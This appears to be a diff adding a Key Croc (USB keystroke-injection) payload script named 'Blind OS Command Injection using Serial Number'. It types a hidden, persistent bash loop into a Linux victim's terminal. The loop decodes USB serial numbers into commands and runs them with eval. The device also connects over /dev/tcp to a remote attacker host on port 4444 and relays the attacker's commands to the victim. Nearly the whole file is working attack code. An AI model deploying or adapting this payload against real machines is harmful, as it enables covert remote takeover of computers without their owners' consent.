@@ -1,0 +1,143 @@
+#!/bin/bash
+#
+# Title:            "Linux" Blind OS Command Injection using Serial Number
+# Description:
+#                   Allows a remote attacker to execute commands on a Linux system, 
+#                   using the serial number as a vector to pass the commands to be executed, 
+#                   without receiving feedback on the results of the commands.
+#
+# Author:           TW-D
+# Version:          1.0
+# Target:           Debian-Based Linux Distributions
+# Category:         Remote Access
+# Attackmode:       HID
+#
+# TESTED ON
+# ===============
+# Key Croc 1.4-stable and Ubuntu 22.04.4 LTS
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## TRIGGER ########
+
+#
+# Not applicable because of matchless payload
+#
+
+######## INITIALIZATION ########
+
+readonly REMOTE_HOST="192.168.0.100"
+readonly REMOTE_PORT="4444"
+
+##
+# 1D6B:0002 === Linux Foundation 2.0 root hub
+# 1D6B:0003 === Linux Foundation 3.0 root hub
+#
+# NOTE : "Linux Foundation X.0 root hub" refers to a USB root hub 
+# managed by the Linux kernel. This hub handles the connections between 
+# the operating system and the physical USB ports on your machine.
+##
+readonly HID_VID="1D6B"
+readonly HID_PID="0002"
+
+######## SETUP ########
+
+LED SETUP
+
+export DUCKY_LANG="us"
+
+######## ATTACK ########
+
+LED ATTACK
+
+ATTACKMODE HID
+
+QUACK CTRL-ALT t
+QUACK DELAY 1500
+QUACK STRING " nohup \"\${BASH}\" -c '"
+QUACK STRING "serial_chunks=();"
+QUACK STRING " while true; do"
+QUACK STRING " serial_chunk=\"\$(lsusb -v -d $HID_VID:$HID_PID 2> /dev/null | grep \"iSerial\" | awk \"{if(length(\\\$3) == 64) print \\\$3}\")\";"
+QUACK STRING " if [[ -n \"\${serial_chunk}\" && ! \"\${serial_chunks[*]}\" =~ \$serial_chunk ]]; then"
+QUACK STRING " serial_chunks+=(\"\${serial_chunk}\");"
+QUACK STRING " if [[ \"\${serial_chunk}\" == *\".\"* ]]; then"
+QUACK STRING " IFS=\":\" read -r -a decimal_chunks <<< \"\$(printf \"%s\" \"\${serial_chunks[@]}\")\";"
+QUACK STRING " binary_concat=\"\";"
+QUACK STRING " for decimal_chunk in \"\${decimal_chunks[@]}\"; do"
+QUACK STRING " decimal_chunk=\"\${decimal_chunk%%.*}\";"
+QUACK STRING " binary_concat+=\"\$(printf %016d \"\$(echo \"obase=2; \${decimal_chunk}\" | bc)\")\";"
+QUACK STRING " done;"
+QUACK STRING " payload=\"\$(for (( i=0; i<\${#binary_concat}; i+=8 )); do printf %s \"\\\x\$(printf %x \$((2#\${binary_concat:i:8})))\"; done)\";"
+QUACK STRING " eval \"\$(echo -e \"\${payload}\")\";"
+QUACK STRING " serial_chunks=();"
+QUACK STRING " sleep 3;"
+QUACK STRING " fi;"
+QUACK STRING " fi;"
+QUACK STRING " sleep 1;"
+QUACK STRING " done"
+QUACK STRING "' &> /dev/null &"
+QUACK DELAY 250
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING " disown && exit"
+QUACK DELAY 250
+QUACK ENTER
+
+######## STAGE2 ########
+
+LED STAGE2
+
+exec 3<>/dev/tcp/${REMOTE_HOST}/${REMOTE_PORT}
+while true; do
+    if echo -n "shell> " >&3; then
+        if read -r payload <&3; then
+            binary="$(for (( i=0; i<${#payload}; i++ )); do printf %08d "$(echo "obase=2; $(printf "%d" "'${payload:i:1}")" | bc)"; done)"
+            decimal_chunks=()
+            while [ -n "${binary}" ]; do
+                binary_chunk="${binary:0:16}"
+                decimal_chunks+=("$(echo "ibase=2; ${binary_chunk}" | bc)")
+                binary="${binary:16}"
+            done
+            decimal_join="$(IFS=":"; echo "${decimal_chunks[*]}.")"
+            while [ -n "${decimal_join}" ]; do
+                while [ "${#decimal_join}" -lt 64 ]; do
+                    decimal_join="${decimal_join}0"
+                done
+                ATTACKMODE HID VID_"0X${HID_VID}" PID_"0X${HID_PID}" SERIAL_"${decimal_join:0:64}"
+                ATTACKMODE OFF
+                decimal_join="${decimal_join:64}"
+            done
+        else
+            break
+        fi
+    else
+        break     
+    fi
+done
+exec 3<&-
+exec 3>&-
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+ATTACKMODE OFF
+
+######## OFF ########
+
+LED OFF
+
+shutdown -h now
